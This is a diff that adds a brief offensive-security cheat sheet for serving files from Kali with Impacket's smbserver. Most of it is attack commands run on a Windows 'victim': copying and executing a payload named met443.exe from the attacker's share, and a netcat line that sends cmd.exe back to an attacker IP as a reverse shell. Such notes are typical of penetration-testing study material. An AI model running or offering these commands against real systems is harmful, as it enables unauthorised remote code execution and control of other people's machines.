@@ -1,1 +1,19 @@
+Impacket smbserver
+https://github.com/CoreSecurity/impacket
+Run smbserver on kali with a share name and the folder you want
 
+smbserver.py share /root/shells
+
+Then from windows victim we can easily copy files
+
+net view \\10.10.10.10
+dir \\10.10.10.10\share
+copy \\10.10.10.10\share\met443.exe .
+
+You can also just execute things remotely:
+\\10.10.10.10\share\met443.exe
+
+Or we can map a network drive/share and run something remotely like this:
+
+net use s: \\\\192.168.49.128\\a
+s:\\nc.exe -e cmd.exe 192.168.49.128 139
